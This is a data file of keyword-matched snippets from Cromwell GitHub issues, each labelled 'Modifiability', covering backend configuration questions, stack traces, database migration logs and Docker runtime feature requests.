cromwell.backend.standard.callcaching.StandardFileHashingActor$$anonfun$fileHashingReceive$1.applyOrElse(StandardFileHashingActor.scala:79); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); 	at akka.actor.Actor.aroundReceive(Actor.scala:514); 	at akka.actor.Actor.aroundReceive$(Actor.scala:512); 	at cromwell.backend.standard.callcaching.StandardFileHashingActor.akka$actor$Timers$$super$aroundReceive(StandardFileHashingActor.scala:59); 	at akka.actor.Timers.aroundReceive(Timers.scala:44); 	at akka.actor.Timers.aroundReceive$(Timers.scala:36); 	at cromwell.backend.standard.callcaching.StandardFileHashingActor.aroundReceive(StandardFileHashingActor.scala:59); 	at akka.actor.ActorCell.receiveMessage(A",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3584:6980,config,config,6980,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3584,1,['config'],['config']
Modifiability,"uns bespoke configured PBSPro. I have successfully managed to run ""hello world"" example workflow using the following configuration for the backend. However, I am unable to modify certain parameters as errors are thrown. . My current configuration is as follows:. ```; runtime-attributes = """"""; Int cpu = 1; Int memory = 1; String raijin_queue = ""express""; String walltime = ""01:00:00""; String jobfs = ""1GB""; String raijin_project_id = ""myproject""; """"""; #Submit string when there is no ""docker"" runtime attribute.; submit = """"""; qsub \; -V \; -N ${job_name} \; -o ${out}.qsub \; -e ${err}.qsub \; -l ncpus=${cpu} \; -l mem=${memory}""GB"" \; -l walltime=${walltime} \; -l jobfs=${jobfs} \; ${""-q "" + raijin_queue} \; -P ${raijin_project_id} \; ${script}; """"""; ```. My specific questions:. 1. I have tried `Float memory_gb = 1.0` as the runtime attribute and `${""-l mem="" + memory_gb + ""GB""}` as the submit string but this fails with `qsub: Illegal attribute or resource value Resource_List.mem` error. Could you please help me with the correct formatting of this attribute? I have copied structure of this from [SGE.conf](https://github.com/broadinstitute/cromwell/blob/787943c0eda793fcc407a3e748b56805f4a2795b/cromwell.example.backends/SGE.conf).; 2. I would like to use `$PROJECT` environment variable as the default value for `raijin_project_id` runtime attribute so that each user can run the same workflow without modification within their allocated project. Is there a way to use environment variable in the config file? I tried ${?PROJECT} and ${PROJECT} as per the recommendations for HOCON but to no avail. I am yet to understand the syntax of HOCON completely to solve this but your help at this time would be much appreciated.; 3. `jobfs` is a parameter used to control scratch space local to the execution node. Currently it is being passed as a string. Is there a way to convert that into GB same as memory but without the use of keyword memory?; Thank you so much for your efforts.; Hardip",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4967:1500,variab,variable,1500,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4967,3,"['config', 'variab']","['config', 'variable']"
Modifiability,"uration if this is the case; 2019-01-31 18:43:04,929 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case; 2019-01-31 18:43:04,934 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case; 2019-01-31 18:43:04,936 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case; 2019-01-31 18:43:04,937 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case; 2019-01-31 18:43:04,937 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case; 2019-01-31 18:43:04,937 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case; 2019-01-31 18:43:05,044 INFO - changelog.xml: changesets/db_schema.xml::db_schema_other_table_alldb::scottfrazer: Table WORKFLOW_EXECUTION created; 2019-01-31 18:43:05,122 INFO - changelog.xml: changesets/db_schema.xml::db_schema_other_table_alldb::scottfrazer: Table EXECUTION created; 2019-01-31 18:43:05,285 INFO - changelog.xml: changesets/db_schema.xml::db_schema_other_table_alldb::scottfrazer: Table JES_JOB created; 2019-01-31 18:43:05,477 INFO - changelog.xml: changesets/db_schema.xml::db_schema_other_table_alldb::scottfrazer: Table LOCAL_JOB created; 2019-01-31 18:43:05,477 INFO - changelog.xml: changesets/db_schema.xml::db_schema_other_table_alldb::scottfrazer: ChangeSet changesets/db_schema.xml::db_schema_other_table_alldb::scottfrazer ran successfully in 538ms; 2019-01-31 18:43:05,650 INFO - changelog.xml: changesets/db_schema.xml::db_schema_symbol_table_mysql::scottfrazer: Table SYMBOL created; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4605:7089,config,configuration,7089,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4605,1,['config'],['configuration']
Modifiability,"uration outside of standard `docker run` commands, it's trivial to distribute Cromwell jobs across Swarm nodes. However, Swarm provides a series of [filters](https://github.com/docker/swarm/tree/master/scheduler/filter) and constrains that control how the scheduler distributes containers to nodes. For example, I might be interested in limiting the execution of a Cromwell job to a specific region / datacenter. This requires you to specify filters in the `docker run` command with the environment flag, `-e`. For example, to run a container on Swarm nodes that run in the `us-east` region:. ```; › docker run -d --name my_image -e constraint:region!=us-east* my_container; ```. Obviously, this configuration should _not_ be managed in the WDL document. Instead, it would be great for the Cromwell command-line tool and REST API to support additional runtime options for specifying Docker environment variables. For example:. ```; › cromwell run --docker-env ""constraint:region!=us-east*"" my_workflow.wdl -; ```. > Hint: Docker supports daemon labels. In the above case, the workflow would; > execute on a Swarm node whose Docker daemon that was started with:; > ; > ```; > docker daemon --label region=us-east; > ```. As for the API, the POST action to `/api/workflows/:version` would allow for multiple Docker env strings. The other feature I would like to request is translating `memory` and `cpu` configuration options (at the task level) to Docker via `--memory` and `--cpuset-cpus` `docker run` flags, respectively. These options are currently only used for the JES backend, but it seems as though they can also be used for the Local backend if Docker is specified. So, to summarize:; 1. Allow Docker `-e` flags to be specified for all tasks in a given workflow.; 2. Allow task `memory` and `cpu` options in a WDL document to be translated to `--memory` and `--cpuset-cpus` in the `docker run` command. Please let me know if there's anything I can do to help this move forward. Cheers! :beers:",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/375:1670,config,configuration,1670,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/375,1,['config'],['configuration']
Modifiability,"ures.CBL_hom_not_SNP_assoc:NA:1 [b303ae23]: Call cache hit process had 0 total hit failures before completing successfully; [2023-03-29 12:35:42,13] [warn] b303ae23-e1e5-4cde-832b-70114e9efdad-BackendCacheHitCopyingActor-b303ae23:expanse_figures.CBL_assoc:-1:1-20000000025 [b303ae23expanse_figures.CBL_assoc:NA:1]: Unrecognized runtime attribute keys: shortTask, dx_timeout; [2023-03-29 13:07:47,67] [info] BT-322 58e64982:expanse_figures.CBL_assoc:-1:1 cache hit copying success with aggregated hashes: initial = B4BFDDD19BC42B30ED73AB035F6BF1DE, file = C3078AB9F63DD3A59655953B1975D6CF.; [2023-03-29 13:07:47,67] [info] 58e64982-cf3d-4e77-ad72-acfda8299d1b-EngineJobExecutionActor-expanse_figures.CBL_assoc:NA:1 [58e64982]: Call cache hit process had 0 total hit failures before completing successfully; ```. Can someone help me diagnose why call caching isn't near instantaneous, and what I can do to make it much faster? Happy to provide more information as necessary. Thanks!. Config:; ```; # See https://cromwell.readthedocs.io/en/stable/Configuring/; # this configuration only accepts double quotes! not singule quotes; include required(classpath(""application"")). system {; abort-jobs-on-terminate = true; io {; number-of-requests = 30; per = 1 second; }; file-hash-cache = true; }. # necessary for call result caching; # will need to stand up the MySQL server each time before running cromwell; # stand it up on the same node that's running cromwell; database {; profile = ""slick.jdbc.MySQLProfile$""; db {; driver = ""com.mysql.cj.jdbc.Driver""; url = ""jdbc:mysql://localhost/cromwell?rewriteBatchedStatements=true""; user = ""root""; password = ""pass""; connectionTimeout = 5000; }; }. call-caching {; enabled = true; invalidate-bad-cache-results = true; }. docker {; hash-lookup {; enabled = true; method = ""remote""; }; }. backend {; # which backend do you want to use?; # Right now I don't know how to choose this via command line, only here; default = ""Local"" # For running jobs on an interacti",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7108:2905,Config,Config,2905,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7108,1,['Config'],['Config']
Modifiability,"url = jdbc:hsqldb:mem:7e164ea8-21fd-4b3a-864c-f8a8ea97645f;shutdown=false;hsqldb.tx=mvcc; [2019-05-22 18:42:25,85] [info] Running migration RenameWorkflowOptionsInMetadata with a read batch size of 100000 and a write batch size of 100000; [2019-05-22 18:42:25,86] [info] [RenameWorkflowOptionsInMetadata] 100%; [2019-05-22 18:42:25,92] [info] Running with database db.url = jdbc:hsqldb:mem:d3111f9f-5515-48da-b4c2-c9014a6eb8ab;shutdown=false;hsqldb.tx=mvcc; [2019-05-22 18:42:26,15] [warn] Unrecognized configuration key(s) for AwsBatch: auth, numCreateDefinitionAttempts, numSubmitAttempts; [2019-05-22 18:42:26,41] [info] Slf4jLogger started; [2019-05-22 18:42:26,62] [info] Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-c5da692"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; [2019-05-22 18:42:26,66] [info] Metadata summary refreshing every 2 seconds.; [2019-05-22 18:42:26,69] [info] WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; [2019-05-22 18:42:26,69] [info] KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; [2019-05-22 18:42:26,71] [info] CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; [2019-05-22 18:42:27,30] [info] JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; [2019-05-22 18:42:27,31] [info] SingleWorkflowRunnerActor: Version 36; [2019-05-22 18:42:27,35] [info] Unspecified type (Unspecified version) workflow 3997371c-9513-4386-a579-a72639c6e960 submitted; [2019-05-22 18:42:27,36] [info] SingleWorkflowRunnerActor: Workflow submitted 3997371c-9513-4386-a579-a72639c6e960; [2019-05-22 18:42:27,36] [info] WorkflowManagerActor Starting workflow 3997371c-9513-4386-a579-a72639c6e960; [2019-05-22 18:42:27,36] [info] WorkflowManagerActor Successfully started WorkflowActor-3997371c-9513-4386-a579-a72639c6e960; ...; [2019-05-22 19:15:20,74] [info] 755021ae-948b-47f",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5004:1963,config,configured,1963,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5004,1,['config'],['configured']
Modifiability,using boolean variables in task command different than WDL specification,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2594:14,variab,variables,14,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2594,1,['variab'],['variables']
Modifiability,"ut files (generated by previous calls) correctly when I restart a workflow with callcaching enabled. Inputs which originate from the same directory are getting split up in the inputs directory inside cromwell-executions. For example, given a workflow like this:; ```wdl; version 1.0; workflow test {; call touch as t1 {; input:; name = ""[...]/cromwell_test/testFile""; }; call touch as t2 {; input:; name = ""[...]/cromwell_test/companionCube""; }; call blah {; input:; file = t1.out,; filesBuddy = t2.out; } ; }; task touch {; input {; String name; }; command {; touch ~{name}; }; output {; File out = name; }; }; task blah {; input {; File file; File filesBuddy; }; command {; exit 1; }; }; ```; We get the following (correct) localization for the initial run:; ```; [...]/cromwell_test/cromwell-executions/test/6d5571c1-6612-4107-bcf5-0b40791d17fb/call-blah/inputs⟫ ls -R; .:; 1981809718. ./1981809718:; companionCube testFile. ```; And the following (incorrect) localization for the rerun:; ```; [...]/cromwell_test/cromwell-executions/test/8aa01c35-d095-483d-84e5-3d72ead73344/call-blah/inputs⟫ ls -R; .:; -1523004024 -1523004025. ./-1523004024:; companionCube. ./-1523004025:; testFile; ```. <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue here, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4965:1948,config,configuration,1948,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4965,1,['config'],['configuration']
Modifiability,utFallback(SimpleIncluder.java:123); at com.typesafe.config.impl.SimpleIncluder.includeResources(SimpleIncluder.java:109); at com.typesafe.config.impl.ConfigParser$ParseContext.parseInclude(ConfigParser.java:181); at com.typesafe.config.impl.ConfigParser$ParseContext.parseObject(ConfigParser.java:237); at com.typesafe.config.impl.ConfigParser$ParseContext.parseValue(ConfigParser.java:103); at com.typesafe.config.impl.ConfigParser$ParseContext.parse(ConfigParser.java:415); at com.typesafe.config.impl.ConfigParser.parse(ConfigParser.java:25); at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:263); at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:250); at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:180); at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:174); at com.typesafe.config.impl.Parseable.parse(Parseable.java:301); at com.typesafe.config.ConfigFactory.parseFile(ConfigFactory.java:793); at com.typesafe.config.ConfigFactory.parseApplicationReplacement(ConfigFactory.java:1166); at com.typesafe.config.DefaultConfigLoadingStrategy.parseApplicationConfig(DefaultConfigLoadingStrategy.java:11); at com.typesafe.config.ConfigFactory.defaultApplication(ConfigFactory.java:532); at com.typesafe.config.ConfigFactory$1.call(ConfigFactory.java:264); at com.typesafe.config.ConfigFactory$1.call(ConfigFactory.java:261); at com.typesafe.config.impl.ConfigImpl$LoaderCache.getOrElseUpdate(ConfigImpl.java:66); at com.typesafe.config.impl.ConfigImpl.computeCachedConfig(ConfigImpl.java:93); at com.typesafe.config.ConfigFactory.load(ConfigFactory.java:261); at com.typesafe.config.ConfigFactory.load(ConfigFactory.java:237); at cromwell.languages.util.ImportResolver$HttpResolver$.apply(ImportResolver.scala:237); at womtool.input.WomGraphMaker$.importResolvers$lzycompute$1(WomGraphMaker.scala:28); at womtool.input.WomGraphMaker$.importResolvers$1(WomGraphMaker.scala:27); at womtool.input.WomGraphMaker$.$anonfun$getBundleAndF,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7255:2367,Config,ConfigFactory,2367,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7255,1,['Config'],['ConfigFactory']
Modifiability,"uteAsync(StandardAsyncExecutionActor.scala:637); at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync$(StandardAsyncExecutionActor.scala:637); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.executeAsync(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:952); at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:944); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.executeOrRecover(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustExecuteOrRecover$1(AsyncBackendJobExecutionActor.scala:65); at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); at cromwell.core.retry.Retry$$anonfun$withRetry$1.$anonfun$applyOrElse$3(Retry.scala:45); at akka.pattern.FutureTimeoutSupport.liftedTree1$1(FutureTimeoutSupport.scala:26); at akka.pattern.FutureTimeoutSupport.$anonfun$after$1(FutureTimeoutSupport.scala:26); at akka.actor.Scheduler$$anon$4.run(Scheduler.scala:205); ... 6 more. </code></pre>; </details>. This is a minimal example of a config which gets such an error:; `Could not evaluate expression: ""echo "" + memory: Cannot perform operation: echo + WomLong(4)`; ```; include required(classpath(""application"")); webservice {; port = 8000; }; backend {; default=""Local""; providers {; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; runtime-attributes = """"""; Int? memory; String? docker; String? docker_user; """"""; submit = """"""; bash ${script}; ${""echo "" + memory}; """"""; }; }; }; } ; ```. This means that the launch command given in the cromwell docs [here](https://cromwell.readthedocs.io/en/stable/backends/SGE/) will not work. A current workaround would be to use an expression like this instead:; `${true=""echo"" false="""" defined(memory)} ${memory}`",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4659:5275,config,config,5275,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4659,4,"['Config', 'config']","['ConfigBackendLifecycleActorFactory', 'config']"
Modifiability,utionActor.instantiatedCommand$lzycompute(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.instantiatedCommand(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor$class.execute(SharedFileSystemAsyncJobExecutionActor.scala:130); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.execute(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$executeOrRecover$2.apply(StandardAsyncExecutionActor.scala:264); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$executeOrRecover$2.apply(StandardAsyncExecutionActor.scala:258); 	at scala.util.Try$.apply(Try.scala:192); 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.executeOrRecover(StandardAsyncExecutionActor.scala:258); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeOrRecover(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$cromwell$backend$async$AsyncBackendJobExecutionActor$$robustExecuteOrRecover$1.apply(AsyncBackendJobExecutionActor.scala:56); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$cromwell$backend$async$AsyncBackendJobExecutionActor$$robustExecuteOrRecover$1.apply(AsyncBackendJobExecutionActor.scala:56); 	at cromwell.core.retry.Retry$.withRetry(Retry.scala:37); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$class.withRetry(AsyncBackendJobExecutionActor.scala:52); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$class.cromwell$backend$async$AsyncBackendJobExecutionActor$$robustExecuteOrRecover(AsyncBackendJobExecutionActor.scala:56); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$receive$1.applyOrElse(AsyncBackendJobExecutionActor.scala:80); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:171); 	at akka.actor.Actor$class,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1944:4477,Config,ConfigAsyncJobExecutionActor,4477,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1944,2,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,utionActor.instantiatedCommand$lzycompute(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.instantiatedCommand(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor$class.execute(SharedFileSystemAsyncJobExecutionActor.scala:136); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.execute(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$executeOrRecover$2.apply(StandardAsyncExecutionActor.scala:306); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$executeOrRecover$2.apply(StandardAsyncExecutionActor.scala:300); 	at scala.util.Try$.apply(Try.scala:192); 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.executeOrRecover(StandardAsyncExecutionActor.scala:300); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeOrRecover(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$cromwell$backend$async$AsyncBackendJobExecutionActor$$robustExecuteOrRecover$1.apply(AsyncBackendJobExecutionActor.scala:47); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$cromwell$backend$async$AsyncBackendJobExecutionActor$$robustExecuteOrRecover$1.apply(AsyncBackendJobExecutionActor.scala:47); 	at cromwell.core.retry.Retry$.withRetry(Retry.scala:37); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$class.withRetry(AsyncBackendJobExecutionActor.scala:43); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$class.cromwell$backend$async$AsyncBackendJobExecutionActor$$robustExecuteOrRecover(AsyncBackendJobExecutionActor.scala:47); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$receive$1.applyOrElse(AsyncBackendJobExecutionActor.scala:71); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:171); 	at akka.actor.Actor$class,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1950:4200,Config,ConfigAsyncJobExecutionActor,4200,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1950,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,utionActor.scala:607); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.instantiatedCommand$lzycompute(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.instantiatedCommand(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.commandScriptContents(StandardAsyncExecutionActor.scala:383); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.commandScriptContents$(StandardAsyncExecutionActor.scala:382); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.commandScriptContents(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents(SharedFileSystemAsyncJobExecutionActor.scala:175); 	 at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents$(SharedFileSystemAsyncJobExecutionActor.scala:174); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.writeScriptContents(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute(SharedFileSystemAsyncJobExecutionActor.scala:158); 	 at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute$(SharedFileSystemAsyncJobExecutionActor.scala:155); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.execute(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$executeAsync$1(StandardAsyncExecutionActor.scala:749); 	 at scala.util.Try$.apply(Try.scala:213); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync(StandardAsyncExecutionActor.scala:749); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync$(StandardAsyncExecutionActor.scala:749); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.executeAsync(ConfigAsyncJobExecutionActor.scala:215); ,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6757:6533,config,config,6533,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6757,1,['config'],['config']
Modifiability,"utput files together.\n"",; ""inputBinding"": {; ""prefix"": ""--jobnodes""; },; ""default"": false,; ""id"": ""#gridss-2.9.4.cwl/jobnodes""; },; {; ""type"": [; ""null"",; ""string""; ],; ""doc"": ""size of JVM heap for assembly and variant calling.\n"",; ""inputBinding"": {; ""prefix"": ""--jvmheap""; },; ""default"": ""$(get_max_memory_from_runtime_memory(runtime.ram))m"",; ""id"": ""#gridss-2.9.4.cwl/jvmheap""; },; {; ""type"": ""boolean"",; ""doc"": ""keep intermediate files. Not recommended except for debugging due to the high disk usage.\n"",; ""inputBinding"": {; ""prefix"": ""--keepTempFiles""; },; ""default"": false,; ""id"": ""#gridss-2.9.4.cwl/keepTempFiles""; },; {; ""type"": [; ""null"",; ""string""; ],; ""doc"": ""comma separated labels to use in the output VCF for the input files.\nSupporting read counts for input files with the same label are aggregated\n(useful for multiple sequencing runs of the same sample).\nLabels default to input filenames, unless a single read group with a non-empty sample name\nexists in which case the read group sample name is used\n(which can be disabled by \""useReadGroupSampleNameCategoryLabel=false\"" in the configuration file).\nIf labels are specified, they must be specified for all input files.\n"",; ""inputBinding"": {; ""prefix"": ""--labels""; },; ""id"": ""#gridss-2.9.4.cwl/labels""; },; {; ""type"": [; ""null"",; ""int""; ],; ""doc"": ""Optional - maximum coverage. Regions with coverage in excess of this are ignored.\n"",; ""inputBinding"": {; ""prefix"": ""--maxcoverage""; },; ""id"": ""#gridss-2.9.4.cwl/maxcoverage""; },; {; ""type"": ""boolean"",; ""doc"": ""do not use JNI native code acceleration libraries (snappy, GKL, ssw, bwa).\n"",; ""inputBinding"": {; ""prefix"": ""--nojni""; },; ""default"": false,; ""id"": ""#gridss-2.9.4.cwl/nojni""; },; {; ""type"": ""string"",; ""doc"": ""output gzipped VCF file\n"",; ""inputBinding"": {; ""prefix"": ""--output""; },; ""id"": ""#gridss-2.9.4.cwl/output""; },; {; ""type"": [; ""null"",; ""string""; ],; ""doc"": ""Optional - additional standard Picard command line options.\nUseful options include VALIDATION_S",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5826:13573,config,configuration,13573,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5826,1,['config'],['configuration']
Modifiability,uts(SharedFileSystemJobCachingActorHelper.scala:40); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor$$anonfun$commandLinePreProcessor$1.apply(SharedFileSystemAsyncJobExecutionActor.scala:127); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor$$anonfun$commandLinePreProcessor$1.apply(SharedFileSystemAsyncJobExecutionActor.scala:127); 	at cromwell.backend.wdl.Command$.instantiate(Command.scala:27); 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.instantiatedCommand(StandardAsyncExecutionActor.scala:83); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.instantiatedCommand$lzycompute(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.instantiatedCommand(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor$class.execute(SharedFileSystemAsyncJobExecutionActor.scala:136); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.execute(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$executeOrRecover$2.apply(StandardAsyncExecutionActor.scala:306); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$executeOrRecover$2.apply(StandardAsyncExecutionActor.scala:300); 	at scala.util.Try$.apply(Try.scala:192); 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.executeOrRecover(StandardAsyncExecutionActor.scala:300); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeOrRecover(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$cromwell$backend$async$AsyncBackendJobExecutionActor$$robustExecuteOrRecover$1.apply(AsyncBackendJobExecutionActor.scala:47); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$cromwell$backend$async$AsyncBackendJobExecutionActor$$robustExecuteOrRecover$1.apply(Async,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1950:3585,config,config,3585,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1950,1,['config'],['config']
